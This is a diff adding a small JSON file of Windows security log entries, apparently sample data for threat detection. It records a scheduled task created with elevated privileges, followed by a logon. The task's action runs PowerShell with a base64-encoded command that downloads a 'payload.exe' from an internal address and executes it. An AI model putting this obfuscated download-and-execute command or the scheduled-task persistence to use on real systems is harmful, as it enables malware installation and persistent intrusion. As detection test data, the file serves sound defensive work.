@@ -1,0 +1,21 @@
+[
+  {
+    "TimeGenerated": "2026-02-23T14:23:15Z",
+    "EventID": 4698,
+    "Computer": "SRV-APP-01",
+    "Account": "JDOE",
+    "TaskName": "UpdaterService",
+    "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Author>JDOE</Author>\n  </RegistrationInfo>\n  <Triggers />\n  <Principals>\n    <Principal id=\"Author\">\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <Enabled>true</Enabled>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>powershell.exe</Command>\n      <Arguments>-Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==</Arguments>\n    </Exec>\n  </Actions>\n</Task>",
+    "IpAddress": "192.168.1.50",
+    "LogType": "Security"
+  },
+  {
+    "TimeGenerated": "2026-02-23T14:23:18Z",
+    "EventID": 4624,
+    "Computer": "SRV-APP-01",
+    "Account": "JDOE",
+    "LogonType": 2,
+    "IpAddress": "192.168.1.50",
+    "Process": "C:\\Windows\\System32\\userinit.exe"
+  }
+]
